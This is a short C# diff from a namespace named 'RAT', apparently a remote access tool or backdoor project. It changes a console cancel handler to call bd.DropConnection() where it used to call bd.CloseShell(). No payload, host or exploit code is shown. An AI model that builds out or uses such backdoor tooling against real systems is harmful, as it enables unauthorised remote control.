@@ -27,7 +27,7 @@ namespace RAT
 
         private static void ConsoleCancelPress(object sender, ConsoleCancelEventArgs e)
         {
-            bd.CloseShell();
+            bd.DropConnection();
         }
     }
 }
